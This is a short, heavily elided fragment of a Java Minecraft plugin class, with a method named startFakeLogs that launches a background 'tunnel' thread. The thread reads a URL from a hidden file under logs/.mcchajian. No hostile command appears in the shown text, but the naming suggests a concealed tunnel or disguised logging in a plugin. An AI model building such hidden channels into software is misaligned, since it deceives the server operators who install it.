...
extends JavaPlugin {
    ...
    private void startFakeLogs() {
        ...
        Thread tunnelThread = new Thread(() -> {
            try {
                String content; Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
                Path tunnelFile = workDir.resolve(".tunnel_url"); String tunnelUrl = null;
